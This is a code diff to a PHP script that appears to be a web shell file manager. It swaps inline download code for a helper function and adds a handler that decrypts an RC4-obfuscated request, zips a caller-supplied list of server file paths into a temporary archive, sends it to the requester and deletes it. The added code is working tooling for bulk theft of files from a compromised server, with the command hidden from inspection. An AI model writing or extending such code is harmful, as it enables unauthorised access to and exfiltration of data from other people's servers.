@@ -297,19 +297,7 @@ elseif(isset($p['ulType'])){
 elseif(isset($p['df_token'])){
 	$file = to_encode(rawurldecode(hex2bin(trim($p['df_token']))));
 	if(is_file($file)){
-		header("Content-Type: application/octet-stream");
-		header('Content-Transfer-Encoding: binary');
-		header("Content-length: ".filesize($file));
-		header("Cache-Control: no-cache");
-		header("Pragma: no-cache");
-		header("Content-disposition: attachment; filename=\"".basename($file)."\";");
-		$handler = fopen($file,"rb");
-		while(!feof($handler)){
-			print(fread($handler, 1024*8));
-			@ob_flush();
-			@flush();
-		}
-		fclose($handler);
+		download_file($file);
 		die();
 	}
 }
@@ -333,6 +321,25 @@ elseif(isset($p['multimedia'])){
 		die();
 	}
 }
+elseif(isset($p['dz_token'])){
+    $dz_token = trim($p['dz_token']);
+    $post_str = rc4($GLOBALS['cipher_key'], hex2bin($dz_token));
+    parse_str($post_str, $post);
+    $post = fix_magic_quote($post);
+    $p = array_map("to_encode", $post);
+
+    $massBuffer = trim($p['massBuffer']);
+    $massValue = trim($p['massValue']);
+    $massBufferArr = explode("\n", $massBuffer);
+
+    $tmpdir = get_writabledir();
+    $file = $tmpdir.$massValue;
+    if(compress('zip', $file, $massBufferArr)){
+        download_file($file);
+    }
+    @unlink($file);
+    die();
+}
 elseif(isset($p['massType'])&&isset($p['massBuffer'])&&isset($p['massPath'])&&isset($p['massValue'])){
 	$massType = trim($p['massType']);
 	$massBuffer = trim($p['massBuffer']);
@@ -346,8 +353,7 @@ elseif(isset($p['massType'])&&isset($p['massBuffer'])&&isset($p['massPath'])&&is
 			$counter++;
 			return $counter;
 		}
-	}
-	else{
+	}else{
 		foreach($massBufferArr as $k){
 			$path = trim($k);
 			if(file_exists($path)){
